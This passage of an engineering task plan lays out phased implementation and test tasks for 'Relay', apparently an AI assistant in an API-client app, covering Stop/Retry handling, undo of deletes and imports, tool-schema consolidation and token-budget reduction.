- **Depends on:** T2.9

### T2.11 ☐ Unit: turn store, tool queue and chat hook
- **Kind:** unit
- **Files:** `src/stores/useRelayTurnStore.ts`, `src/hooks/useToolQueue.ts`, `src/hooks/relayTurnHelpers.ts`, `src/hooks/useRelayChat.ts`
- **Do:** Write failing-first specs: every legal transition and rejection of illegal ones (HH-TURN); fetch count after Stop during an approved `run_chain` is zero, late output recorded without a request, Stop with zero tools / during approval / then Send (HH-H01); three creates then step 4 error then Retry yields exactly 3 requests, plain resend when no tool step, Continue after `step_cap`, Retry after `capped`/`stopped` (HH-H05, L-23); captured thread/turn used after a switch, deleted thread dropped without crash, change log carries the captured turn id, "Undo all" in the new thread does not revert it (HH-H06); abort signal reaches the tool, aborted state honest, `approvedRunning` counts auto tools, no `sendMessage` with a pending tool (HH-M01, HH-M20).
- **Acceptance:** Covers HH-TURN, HH-H01, HH-H05, HH-H06, HH-M01, HH-M20, L-23. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/stores/useRelayTurnStore.spec.ts src/hooks/useToolQueue.spec.ts src/hooks/relayTurnHelpers.spec.ts src/hooks/useRelayChat.spec.ts --coverage --coverage.include=src/stores/useRelayTurnStore.ts,src/hooks/useToolQueue.ts,src/hooks/relayTurnHelpers.ts,src/hooks/useRelayChat.ts --coverage.reporter=text`
- **Depends on:** T2.10

### T2.12 ☐ Unit: persistence, cross-tab sync, change grouping and Keep/Undo
- **Kind:** unit
- **Files:** `src/lib/relay/threadDb.ts`, `src/stores/useRelayStore.ts`, `src/stores/useRelayPermissionStore.ts`, `src/lib/relay/changeGroups.ts`, `src/components/relay/KeepUndoDialog.tsx`
- **Do:** Write failing-first specs: throttled partial save, `pagehide` flush, thread-switch flush, restored partial marked Interrupted (HH-M21); failed save keeps pending entry and "not saved" after 3 failures (L-26); stale `updatedAt` write rejected (L-16); running marker restore as interrupted, legacy thread restore, auto tool without result settles as interrupted (HH-M22, L-03); simulated `storage` event rehydrates mode and `enabled`, pending turn-off persisted (HH-M24, L-10); grouping counts `changeIds` and Keep re-keys changes to the new turn (HH-M23, L-21); `KeepUndoDialog` lists the turn's changes, "Undo them" reverts them and "Keep them" re-keys them (HH-M23).
- **Acceptance:** Covers HH-M21, HH-M22, HH-M23, HH-M24, L-03, L-10, L-16, L-21, L-26. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/threadDb.spec.ts src/stores/useRelayStore.spec.ts src/stores/useRelayPermissionStore.spec.ts src/lib/relay/changeGroups.spec.ts src/components/relay/KeepUndoDialog.spec.tsx --coverage --coverage.include=src/lib/relay/threadDb.ts,src/stores/useRelayStore.ts,src/stores/useRelayPermissionStore.ts,src/lib/relay/changeGroups.ts,src/components/relay/KeepUndoDialog.tsx --coverage.reporter=text`
- **Depends on:** T2.11

### T2.13 ☐ Unit: composer and action components
- **Kind:** unit
- **Files:** `src/components/relay/RelayComposer.tsx`, `src/components/relay/MessageActions.tsx`, `src/components/relay/TurnChangeBar.tsx`, `src/components/relay/ToolRow.tsx`, `src/components/relay/ErrorBubble.tsx`
- **Do:** Write failing-first component specs: composer shows Stop and disables Send while any tool runs (HH-M20, HH-M01); Retry vs Regenerate buttons and Continue on `step_cap` (HH-H05, L-23); Keep/Undo dialog opens before Regenerate and Edit & resend with applied changes (HH-M23); Changes bar count equals "Undo all" (HH-M23, L-21); Interrupted / "may have applied" rendering with change-log link and Declined for cancelled `import_backup` (HH-M22, L-18).
- **Acceptance:** Covers HH-H05, HH-M20, HH-M22, HH-M23, L-18, L-21, L-23. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/components/relay/RelayComposer.spec.tsx src/components/relay/MessageActions.spec.tsx src/components/relay/TurnChangeBar.spec.tsx src/components/relay/ToolRow.spec.tsx src/components/relay/ErrorBubble.spec.tsx --coverage --coverage.include=src/components/relay/RelayComposer.tsx,src/components/relay/MessageActions.tsx,src/components/relay/TurnChangeBar.tsx,src/components/relay/ToolRow.tsx,src/components/relay/ErrorBubble.tsx --coverage.reporter=text`
- **Depends on:** T2.12

### T2.14 ☐ E2E: turn lifecycle
- **Kind:** e2e
- **Scenarios:**
  - `@critical` Stop mid-`run_chain` in Skip mode: no follow-up model request and the composer returns to idle (HH-H01, HH-M01)
  - `@critical` Retry after step 4 error: exactly 3 new requests in the sidebar, no duplicates (HH-H05)
  - `@critical` switch threads with a queued tool: the change shows in the original thread's Changes bar and "Undo all" in the new thread does not revert it (HH-H06)
  - `@high` Regenerate on a turn with applied changes shows Keep/Undo; Undo reverts, Keep leaves them counted under the new turn (HH-M23)
  - `@high` reload during an approved call shows "interrupted, may have applied", not "Declined" (HH-M22)
  - `@high` Send is disabled while an auto tool runs (HH-M20)
  - `@medium` partial reply survives a reload marked Interrupted (HH-M21)
  - `@medium` a mode change in one page is seen by a second page of the same context before its next tool call (HH-M24)
- **Spec:** `e2e/qa/relay-harness-hardening/lifecycle.spec.ts`
- **Acceptance:** Every scenario passes 3 of 3 repeats; the Stop scenario counts model requests; the Retry scenario asserts exact store counts.
- **Files:** none expected.
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/lifecycle.spec.ts --repeat-each=3`; `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay/relay-chat.spec.ts e2e/qa/relay/relay-confirm.spec.ts`
- **Depends on:** T2.13

🔶 **Checkpoint 2**: the full relay unit suite is green, Stop/Retry/thread switch/Regenerate scenarios pass in `lifecycle.spec.ts`, existing relay specs unchanged apart from the replaced Stop spec; headless check of Stop in Skip mode done.

---

## Phase 3: Undo fidelity (HH-UNDO, H07, H09, M10, M11, M12, M13, M14)

**Adds:** Undo now restores deleted collections together with their chains, imported backups, the active environment and open tabs; multi-deletes validate everything first, and Relay edits to an open request are no longer lost when you press Save.
**Try in UI:** Delete a collection that has a chain, press Undo, and confirm the chain is back ; Delete the active environment, Undo, and confirm it is active again ; Ask Relay to change the URL of an open clean request and press Save; confirm the new URL is kept ; Import a backup via Relay and press Undo to confirm exactly the imported items disappear.

### T3.1 ☐ HH-UNDO: adapter contract and property-test harness
- **Kind:** implementation
- **Files:** `src/lib/relay/changeLog.ts`, `src/lib/relay/testing/changeLogTestKit.ts`
- **Do:** Extend the adapter shape: `dependents()` (chain <-> collection, active environment, open tabs), atomic all-or-nothing restore returning a status `ok | conflict | unavailable | already-undone`, a snapshot that includes `wasActive`, closed tab ids (so Undo reopens them) and `isDirty` (L-14), and an "Undo unavailable" state when IndexedDB is missing (L-15). A throwing undo leaves the store unchanged; a second undo is a no-op returning `already-undone`. Keep every legacy snapshot readable (missing `wasActive`, `PROXY_KEYS`). Extend `changeLogTestKit.ts` with a helper that enumerates every write tool through the registry and exposes write -> undo -> deep-equal for the Unit task's property spec (the spec itself is authored in T3.9).
- **Acceptance:**
  - The adapter contract exposes dependents, status, atomic restore and tab ids (HH-UNDO).
  - A throwing undo leaves the store unchanged; a second undo returns `already-undone` (HH-UNDO, L-15).
  - Restoring a tab-only edit restores `isDirty` with the snapshot (L-14).
  - Legacy change-log entries without the new fields still undo.
  - Undo after the entity was edited later returns `conflict` and keeps the existing conflict message (Phase 3 edge case).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/changeLog.ts src/lib/relay/testing/changeLogTestKit.ts`

### T3.2 ☐ HH-H09 and HH-M12: collection chain capture; standalone chain duplicates
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/collectionWrite.ts`, `src/lib/relay/tools/duplicateTools.ts`, `src/stores/useChainStore.ts`, `src/stores/useCollectionsStore.ts`, `src/lib/relay/changeLog.ts`
- **Do:** `captureTree` includes the collection's chain and restore re-creates it. Chain copies are `standalone` (R1) with no collection link duplicated; `duplicate_collection` copies the chain so the duplicate has its own. Undo of a chain duplicate works. Delete of a collection with a chain and open tabs must restore all of it.
- **Acceptance:**
  - Delete a collection with a chain, then Undo: the store deep-equals the pre-delete store including the chain (HH-H09).
  - A chain copy appears in the chain list and search; the original collection still has one chain (HH-M12).
  - A duplicated collection has its own chain (HH-M12).
- **Verify:** `bunx vitest run src/lib/relay src/stores`; `bunx biome check src/lib/relay/tools/collectionWrite.ts src/lib/relay/tools/duplicateTools.ts src/stores/useChainStore.ts src/stores/useCollectionsStore.ts src/lib/relay/changeLog.ts`
- **Depends on:** T3.1

### T3.3 ☐ HH-M13 and L-09: active environment survives Undo
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/environmentWrite.ts`, `src/lib/relay/changeLog.ts`, `src/lib/relay/changesSummary.ts`
- **Do:** Snapshot `wasActive` in `delete_environment` and call `setActive` on undo. Give active-environment changes their own `action` instead of inferring "created" from `before === null` (L-09); update `changesSummary.ts` for the new action. Cover deleting the only/active environment.
- **Acceptance:**
  - Delete the active environment, Undo: the same environment is active (HH-M13).
  - An active-environment change records its own `action` and is summarised correctly (L-09).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/tools/environmentWrite.ts src/lib/relay/changeLog.ts src/lib/relay/changesSummary.ts`
- **Depends on:** T3.2

### T3.4 ☐ HH-M10: all-or-nothing multi-delete
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/destructive.ts`
- **Do:** Validate every id before any delete; on any failure delete nothing and return the full error naming the bad id(s) (A19).
- **Acceptance:**
  - A list with one bad id deletes nothing and reports that id (HH-M10).
- **Verify:** `bunx vitest run src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/destructive.ts`

### T3.5 ☐ HH-M11: `import_backup` is undoable
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/backupTools.ts`, `src/components/relay/ImportBackupConfirm.tsx`, `src/lib/relay/changeLog.ts`
- **Do:** Record the merged entity ids as one change with an adapter entry; the card and "Undo all" cover it. Undo removes exactly the merged entities and restores overwritten ones (import of an existing id included).
- **Acceptance:**
  - Import then Undo removes exactly the merged entities and restores overwritten ones (HH-M11).
  - The confirm card and "Undo all" both include the import (HH-M11).
- **Verify:** `bunx vitest run src/lib/relay src/components/relay`; `bunx biome check src/lib/relay/tools/backupTools.ts src/components/relay/ImportBackupConfirm.tsx src/lib/relay/changeLog.ts`
- **Depends on:** T3.3

### T3.6 ☐ HH-M14: one save path for tabs
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/tabs.ts`, `src/stores/useTabsStore.ts`, `src/hooks/useSaveRequest.ts`
- **Do:** "Save all & close" and the dirty-gate save both call the same save function as `useSaveRequest`, so assertions are no longer dropped.
- **Acceptance:**
  - A tab with assertions saved through the editor, through Save all & close and through the dirty-gate retains the assertions (HH-M14).
- **Verify:** `bunx vitest run src/hooks src/stores src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/tabs.ts src/stores/useTabsStore.ts src/hooks/useSaveRequest.ts`
- **Depends on:** T3.5

### T3.7 ☐ HH-H07: Relay edits to an open request survive Save
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/requestWrite.ts`, `src/lib/relay/tools/tabs.ts`, `src/stores/useTabsStore.ts`, `src/lib/relay/changeLog.ts`, `src/lib/relay/tools/schemas.ts`
- **Do:** Request writes patch a clean open tab. A dirty tab routes the edit through the dirty-tab confirm gate shipped in T1.8, shown in every mode: `save-all` saves the tab's edits first then applies the Relay edit and patches the tab; `discard` drops the tab's edits then applies (values from `CLOSE_DECISIONS`); declining leaves request and tab untouched (A5). Undo restores the request and the tab with no false conflict. Do not re-create the gate.
- **Acceptance:**
  - Relay edits the URL of a clean open request: the tab shows the new URL, stays clean, and Save keeps it (HH-H07).
  - Dirty tab, Review and Skip: `save-all` keeps tab edits plus the Relay edit, `discard` keeps only the Relay edit, decline leaves both untouched (HH-H07).
  - Undo still works afterwards with no false conflict and also restores the tab (HH-H07).
- **Verify:** `bunx vitest run src/lib/relay src/stores`; `bunx biome check src/lib/relay/tools/requestWrite.ts src/lib/relay/tools/tabs.ts src/stores/useTabsStore.ts src/lib/relay/changeLog.ts src/lib/relay/tools/schemas.ts`
- **Depends on:** T1.8, T3.1, T3.6

### T3.8 ☐ Locale: Phase 3 strings
- **Kind:** implementation
- **Files:** `messages/en/relayDock.json`, `messages/fr/relayDock.json`, `messages/ja/relayDock.json`
- **Do:** Add en/fr/ja keys for the undo statuses (`conflict`, `unavailable`, `already-undone`), "Undo unavailable", the multi-delete failure message naming bad ids, and the dirty-tab edit gate wording (save-all / discard / decline). Preserve ICU placeholders.
- **Acceptance:**
  - Every new Phase 3 string exists in en, fr and ja with identical placeholders (HH-UNDO, HH-M10, HH-H07, L-15).
  - The locale parity spec stays green.
- **Verify:** `bunx vitest run src/i18n src/components/relay`; `bunx biome check messages/en/relayDock.json messages/fr/relayDock.json messages/ja/relayDock.json`
- **Depends on:** T3.7

### T3.9 ☐ Unit: undo contract and property test
- **Kind:** unit
- **Files:** `src/lib/relay/changeLog.ts`, `src/lib/relay/tools/collectionWrite.ts`, `src/lib/relay/tools/duplicateTools.ts`, `src/lib/relay/tools/environmentWrite.ts`, `src/lib/relay/tools/destructive.ts`
- **Do:** Author `changeLog.property.spec.ts` using the T3.1 kit: enumerate every write tool via the registry and assert write -> undo -> deep-equal of the store snapshot; the spec fails when a new write tool lacks a case. Add failing-first specs for: throwing undo leaves the store unchanged, second undo returns `already-undone`, later-edited entity returns `conflict`, IndexedDB-unavailable state, tab-only edit `isDirty` restore (HH-UNDO, L-14, L-15); collection+chain delete/undo and chain duplicate / `duplicate_collection` chain (HH-H09, HH-M12); active-environment delete/undo and the own `action` (HH-M13, L-09); multi-delete with one bad id (HH-M10); legacy snapshots (no `wasActive`, `PROXY_KEYS`) still undo.
- **Acceptance:** Covers HH-UNDO, HH-H09, HH-M10, HH-M12, HH-M13, L-09, L-14, L-15. The property test passes for every write tool; every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/changeLog.property.spec.ts src/lib/relay/changeLog.spec.ts src/lib/relay/tools/collectionWrite.spec.ts src/lib/relay/tools/duplicateTools.spec.ts src/lib/relay/tools/environmentWrite.spec.ts src/lib/relay/tools/destructive.spec.ts --coverage --coverage.include=src/lib/relay/changeLog.ts,src/lib/relay/tools/collectionWrite.ts,src/lib/relay/tools/duplicateTools.ts,src/lib/relay/tools/environmentWrite.ts,src/lib/relay/tools/destructive.ts --coverage.reporter=text`
- **Depends on:** T3.8

### T3.10 ☐ Unit: backup import, tab save and open-request edits
- **Kind:** unit
- **Files:** `src/lib/relay/tools/backupTools.ts`, `src/lib/relay/tools/tabs.ts`, `src/stores/useTabsStore.ts`, `src/lib/relay/tools/requestWrite.ts`, `src/stores/useChainStore.ts`
- **Do:** Write failing-first specs: `import_backup` records one change, Undo removes exactly the merged entities and restores overwritten ones (existing id included) (HH-M11); assertions retained through editor save, Save all & close and the dirty-gate (HH-M14); clean open tab patched and stays clean, dirty tab with `save-all` / `discard` / decline in Review and Skip, undo restores request and tab with no false conflict (HH-H07); chain store round trip supporting the collection chain restore.
- **Acceptance:** Covers HH-M11, HH-M14, HH-H07. Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/tools/backupTools.spec.ts src/lib/relay/tools/tabs.spec.ts src/stores/useTabsStore.spec.ts src/lib/relay/tools/requestWrite.spec.ts src/stores/useChainStore.spec.ts --coverage --coverage.include=src/lib/relay/tools/backupTools.ts,src/lib/relay/tools/tabs.ts,src/stores/useTabsStore.ts,src/lib/relay/tools/requestWrite.ts,src/stores/useChainStore.ts --coverage.reporter=text`
- **Depends on:** T3.9

### T3.11 ☐ E2E: undo fidelity and open-request edits
- **Kind:** e2e
- **Scenarios:**
  - `@critical` Relay edits the URL of a clean open request: tab shows it, stays clean, Save keeps it, Undo restores request and tab (HH-H07)
  - `@critical` dirty tab: the gate appears in Review and in Skip; `save-all`, `discard` and decline each leave the expected request and tab state (HH-H07)
  - `@critical` delete a seeded collection with a chain, Undo: collection and chain are both back (HH-H09)
  - `@high` import a backup that overwrites an existing id, Undo: exactly the merged entities are removed and the overwritten one is restored (HH-M11)
  - `@high` delete the active environment, Undo: it is active again (HH-M13)
  - `@medium` multi-delete with one bad id deletes nothing and reports the id (HH-M10)
  - `@medium` Save all & close keeps assertions (HH-M14)
- **Spec:** `e2e/qa/relay-harness-hardening/undo.spec.ts`
- **Acceptance:** Every scenario passes 3 of 3 repeats; each Undo scenario compares the sidebar/IndexedDB state to the pre-action state.
- **Files:** `e2e/fixtures/seed/relay-harness-hardening.json` (new, only if existing `chaining.json`/`base.json` lack a collection+chain+active environment+open request; register it in `SEED_FILES` and run `bun run qa:seed:build`)
- **Verify:** `PLAYWRIGHT_TEST_BASE_URL=https://requestly.localhost/app bunx playwright test e2e/qa/relay-harness-hardening/undo.spec.ts --repeat-each=3`
- **Depends on:** T3.10

🔶 **Checkpoint 3**: the property test is green for every write tool, per-entity specs pass, and `undo.spec.ts` (edit open request, delete collection with chain then Undo, import backup Undo) is green; legacy snapshots still undo.

---

## Phase 4: Tool surface and token cost (M00, M02, M03, M09, M15, M16, M17, M18, M19, M26, M27)

**Adds:** Relay can list valid API catalog slugs before importing, read and write request shapes now match, overlapping tools are merged, only the tools a turn needs are sent (about 60% fewer tool tokens), long tool loops no longer overflow context, and the scope prompt stays in sync with the real tools.
**Try in UI:** Ask Relay to "import the Stripe API from the catalog" and confirm it lists valid slugs first and refuses a second import ; Type a slash command and confirm only its tools are used ; Open an old thread that used a removed tool name and confirm it still renders ; Ask Relay "export my history" and confirm it is in scope.

### T4.1 ☐ HH-M02 and L-22 (part): one read/write vocabulary
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/requestWrite.ts`, `src/lib/relay/tools/workspaceRead.ts`, `src/lib/relay/tools/tabRequests.ts`, `src/lib/relay/server/systemPrompt.ts`
- **Do:** Make the read vocabulary (`form-data`, `xml`, `html`, `api-key`, `key`, `value`) the single shared vocabulary for reads and writes (A14); `xml` and `html` bodies become writable. L-22 part: `update_tab_request` describes both `tabId` sources; `open_page.section` rejects non-settings pages; the system prompt lists the remaining parity gaps (accent colour, timeout/SSL/redirect writes, pin, saving GraphQL) as limitations. The folder pill and `get_workspace_summary` sub-items stay open (REPORT marks L-22 partial).
- **Acceptance:**
  - Read -> write -> read for each body type and auth type is identical (HH-M02).
  - `xml` and `html` bodies are writable (HH-M02).
  - `update_tab_request` mentions both `tabId` sources, `open_page.section` rejects non-settings pages, and the prompt lists the parity gaps (L-22 part).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/tools/requestWrite.ts src/lib/relay/tools/workspaceRead.ts src/lib/relay/tools/tabRequests.ts src/lib/relay/server/systemPrompt.ts`
- **Depends on:** T1.9, T3.7

### T4.2 ☐ HH-M17 and HH-M19: nullish chain fields; drop `graphql` body type
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/chainWrite.ts`
- **Do:** Use `.nullish()` on the chain fields (A9, not `experimental_repairToolCall`) so `add_chain_node` accepts omitted nullable keys and the JSON schema marks them optional. Remove `graphql` from the relay tool `BODY_TYPES` in `schemas.ts` (not `src/lib/shareLink.ts`); reword the description to stop promising wrapping and point GraphQL to `create_graphql_request` (A13). A persisted thread whose tool input has `type:"graphql"` must still render.
- **Acceptance:**
  - `add_chain_node` accepts input with nullable keys omitted; the JSON schema marks them optional (HH-M17).
  - `BODY_TYPES` has no `graphql` and `set_request_body{type:"graphql"}` fails zod; the description points to `create_graphql_request` (HH-M19).
  - A persisted thread with `type:"graphql"` in a tool input still renders (HH-M19).
- **Verify:** `bunx vitest run src/lib/relay src/components/relay`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/tools/chainWrite.ts`
- **Depends on:** T4.1

### T4.3 ☐ HH-M18: merge overlapping tools and unify `parentId`
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/capabilities.ts`, `src/lib/relay/tools/collectionWrite.ts`, `src/lib/relay/tools/folderTools.ts`, `src/lib/relay/tools/destructive.ts`
- **Do:** Keep `delete_requests`, drop `delete_request` (also from `capabilities.ts` ~L107,166; keep its en/fr/ja labels so old threads render). `create_collection` loses `parentId`. Collection tools accept collection ids only and reject folder ids with a coded error that names the folder tool; every destination-parent input is named `parentId` (rename `move_item.toParentId`; L-13 otherwise out of scope).
- **Acceptance:**
  - The registry lists no overlapping pair (HH-M18).
  - `parentId` is accepted everywhere and `toParentId` is gone (HH-M18).
  - Collection tools reject a folder id with a coded error that names the folder tool (HH-M18).
  - A persisted thread containing `delete_request` renders read-only without errors (HH-M18).
- **Verify:** `bunx vitest run src/lib/relay src/components/relay`; `bunx biome check src/lib/relay/tools/schemas.ts src/lib/relay/capabilities.ts src/lib/relay/tools/collectionWrite.ts src/lib/relay/tools/folderTools.ts src/lib/relay/tools/destructive.ts`
- **Depends on:** T4.2

### T4.4 ☐ HH-M00, HH-M09, L-06: catalog listing, validated slugs, shared Hub import
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/catalogTools.ts`, `src/lib/relay/tools/registry.ts`, `src/lib/relay/tools/schemas.ts`, `src/lib/hub.ts` (existing `importHubEntry`, `getImportedSlugs`, `isValidHubSlug` used by `HubProviderCard.tsx`; make `importHubEntry` the shared one-commit import)
- **Do:** Add the read tool `list_api_catalog` (search and paged, valid slugs from the hub index). `import_api_catalog` validates the slug before the approval card shows. Reuse the Hub UI's import function, refuse already-imported slugs (including ones imported under a different name), and do the import in one commit so it cannot fail half-written. Add a generic `validate(input)` step in `registry.ts` that runs before cards for id-bearing tools (L-06): unknown ids fail fast and cards never preview "Delete 0".
- **Acceptance:**
  - An unknown slug fails before any card; every slug from `list_api_catalog` imports (HH-M00).
  - Slug lists larger than one page are paged correctly (HH-M00).
  - Importing twice is refused with a clear error; a forced failure after the collection leaves no collection behind (HH-M09).
  - Unknown ids fail fast before a card and no card previews "Delete 0" (L-06).
- **Verify:** `bunx vitest run src/lib/relay src/lib/hub.spec.ts src/components/hub`; `bunx biome check src/lib/relay/tools/catalogTools.ts src/lib/relay/tools/registry.ts src/lib/relay/tools/schemas.ts src/lib/hub.ts`
- **Depends on:** T4.3

### T4.5 ☐ HH-M15: read-after-write gaps
- **Kind:** implementation
- **Files:** `src/lib/relay/tools/workspaceRead.ts`, `src/lib/relay/tools/tabRequests.ts`, `src/lib/relay/tools/history.ts`, `src/lib/relay/tools/schemas.ts`
- **Do:** `get_request` returns assertions, timeout, SSL and redirects; `get_tab_request` reads HTTP tabs; add `list_history`; include folders in search. Keep the shared fence helper from T1.9 around WebSocket output in `tabRequests.ts`.
- **Acceptance:**
  - Each of the four additions is asserted in tool specs (HH-M15).
  - `generate_tests` output is verifiable via `get_tab_request` (HH-M15).
  - The WebSocket output stays fenced and stripped (L-04 not regressed).
- **Verify:** `bunx vitest run src/lib/relay/tools`; `bunx biome check src/lib/relay/tools/workspaceRead.ts src/lib/relay/tools/tabRequests.ts src/lib/relay/tools/history.ts src/lib/relay/tools/schemas.ts`
- **Depends on:** T4.4

### T4.6 ☐ HH-M03 (a): capability topics and `load_tools`
- **Kind:** implementation
- **Files:** `src/lib/relay/capabilities.ts`, `src/lib/relay/tools/loadTools.ts` (new), `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/registry.ts`
- **Do:** Derive topics from the existing capability categories (A11; categories are the single source). Add the core tool `load_tools{topic}` (zod enum of topics; unknown topic rejected) that enables a group for the rest of the turn. Define the core always-on set. A tool outside the enabled set returns a coded `load_tools_first` error (no crash). Must come after T4.1-T4.5 so tool names are final.
- **Acceptance:**
  - `load_tools` is core and enables a group for the rest of the turn; an unknown topic is rejected by zod (HH-M03).
  - A call outside the enabled set returns the coded `load_tools_first` error (HH-M03).
  - No tool disappears while it has a pending result (HH-M03).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/capabilities.ts src/lib/relay/tools/loadTools.ts src/lib/relay/tools/schemas.ts src/lib/relay/tools/registry.ts`
- **Depends on:** T4.5

### T4.7 ☐ HH-M03 (b), L-02 (narrowed), L-20: server-computed tool set and slash topics
- **Kind:** implementation
- **Files:** `src/app/api/relay/chat/route.ts`, `src/lib/relay/slashCommands.ts`, `src/lib/relay/attachments.ts`, `src/lib/relay/constants.ts`
- **Do:** The server computes the enabled set (core + slash-command topic + attachment-kind topics + `load_tools` calls in the current turn) and sends only those tools. Reword the `/run` description to match `requiresTarget: "request"` (L-20). Document that this narrows L-02 only (no assistant-turn signing; a direct caller who fabricates history is not stopped). Enabled topic groups persist across a Retry.
- **Acceptance:**
  - The route sends only core + slash topic + attachment-kind topics + `load_tools` topics, asserted on the route (HH-M03).
  - A slash command and an attachment kind each add only their group (HH-M03).
  - The `/run` description string matches `requiresTarget: "request"` (L-20).
  - Measured tool-payload characters for a plain turn are <= 20,000 (from 48,132) (HH-M03).
- **Verify:** `bunx vitest run src/lib/relay src/app/api/relay`; `bunx biome check src/app/api/relay/chat/route.ts src/lib/relay/slashCommands.ts src/lib/relay/attachments.ts src/lib/relay/constants.ts`
- **Depends on:** T4.6

### T4.8 ☐ HH-M16, HH-M27, L-01: prompt wording, generated scope list, mode awareness
- **Kind:** implementation
- **Files:** `src/lib/relay/server/systemPrompt.ts`, `src/lib/relay/prompts/index.ts`, `src/lib/relay/contextBuilder.ts`, `src/lib/relay/tools/schemas.ts`
- **Do:** Allow independent calls in one step (A10): remove "one logical change at a time" and state that parallel calls count as one step; no new batch tool. Generate the prompt scope list from the capability categories so it cannot drift from the registry ("export my history" is in scope). State the permission mode in the per-request context and stop tool descriptions promising a card in all modes (L-01). Keep wording diffs minimal.
- **Acceptance:**
  - The system prompt no longer contains "one logical change at a time" (HH-M16).
  - A step with N parallel `create_request` calls counts as one step; a scripted 15-request build fits the 12-step cap (HH-M16).
  - A test fails if a capability category is missing from the prompt; "export my history" is in scope (HH-M27).
  - The per-request context states the permission mode; no description promises a card in all modes (L-01).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/server/systemPrompt.ts src/lib/relay/prompts/index.ts src/lib/relay/contextBuilder.ts src/lib/relay/tools/schemas.ts`
- **Depends on:** T4.7

### T4.9 ☐ HH-M26: stub older tool results in the current turn
- **Kind:** implementation
- **Files:** `src/lib/relay/contextBuilder.ts`, `src/lib/relay/tokenBudget.ts`, `src/lib/relay/constants.ts`
- **Do:** Add `RELAY_KEEP_TOOL_RESULTS = 6`. When the current turn holds more than that, replace older tool outputs with a stub that keeps `toolCallId`, tool name and part state so call/result pairing stays valid; never stub pending or awaiting-approval parts (A18).
- **Acceptance:**
  - After 8 tool results the earliest are stubs in the next request body and the latest 6 are untouched (HH-M26).
  - A 12-step loop stays under the `context_too_long` cap in a scripted test (HH-M26).
  - Pending/awaiting-approval parts are never stubbed and pairing stays valid (HH-M26).
- **Verify:** `bunx vitest run src/lib/relay`; `bunx biome check src/lib/relay/contextBuilder.ts src/lib/relay/tokenBudget.ts src/lib/relay/constants.ts`
- **Depends on:** T4.8

### T4.10 ☐ Locale: Phase 4 labels and error codes
- **Kind:** implementation
- **Files:** `messages/en/relayDock.json`, `messages/fr/relayDock.json`, `messages/ja/relayDock.json`
- **Do:** Add en/fr/ja labels for `list_api_catalog`, `list_history`, `load_tools`, and every renamed/merged tool; error codes for the folder-id refusal, `load_tools_first`, catalog already-imported and unknown-slug. Keep the `delete_request` labels. Preserve ICU placeholders.
- **Acceptance:**
  - Every added or renamed tool and each new Phase 4 error code has en, fr and ja entries (HH-M00, HH-M03, HH-M15, HH-M18).
  - Old-thread tool labels (`delete_request`) remain.
- **Verify:** `bunx vitest run src/i18n src/lib/relay`; `bunx biome check messages/en/relayDock.json messages/fr/relayDock.json messages/ja/relayDock.json`
- **Depends on:** T4.9

### T4.11 ☐ Unit: request shapes, chain fields, read-after-write
- **Kind:** unit
- **Files:** `src/lib/relay/tools/schemas.ts`, `src/lib/relay/tools/requestWrite.ts`, `src/lib/relay/tools/workspaceRead.ts`, `src/lib/relay/tools/tabRequests.ts`, `src/lib/relay/tools/chainWrite.ts`
- **Do:** Write failing-first specs: read -> write -> read round trip for each body and auth type, `xml`/`html` writable (HH-M02); `add_chain_node` with omitted nullable keys, JSON schema optional (HH-M17); `BODY_TYPES` has no `graphql` and zod rejects it, description points to `create_graphql_request` (HH-M19); `get_request` extras, `get_tab_request` HTTP, folders in search, `generate_tests` verifiable via `get_tab_request` (HH-M15); L-22 part strings (`tabId` sources, `open_page.section`).
- **Acceptance:** Covers HH-M02, HH-M15 (except `list_history`), HH-M17, HH-M19, L-22 (part). Every new test fails on pre-fix code. Every file >=80% on all four metrics, target >95%.
- **Verify:** `bunx vitest run src/lib/relay/tools/schemas.surface.spec.ts src/lib/relay/tools/requestWrite.spec.ts src/lib/relay/tools/workspaceRead.spec.ts src/lib/relay/tools/tabRequests.spec.ts src/lib/relay/tools/chainWrite.spec.ts --coverage --coverage.include=src/lib/relay/tools/schemas.ts,src/lib/relay/tools/requestWrite.ts,src/lib/relay/tools/workspaceRead.ts,src/lib/relay/tools/tabRequests.ts,src/lib/relay/tools/chainWrite.ts --coverage.reporter=text`
- **Depends on:** T4.10

### T4.12 ☐ Unit: catalog, tool merge, history, topics
- **Kind:** unit
- **Files:** `src/lib/relay/tools/catalogTools.ts`, `src/lib/relay/tools/folderTools.ts`, `src/lib/relay/tools/history.ts`, `src/lib/relay/capabilities.ts`, `src/lib/relay/tools/loadTools.ts`
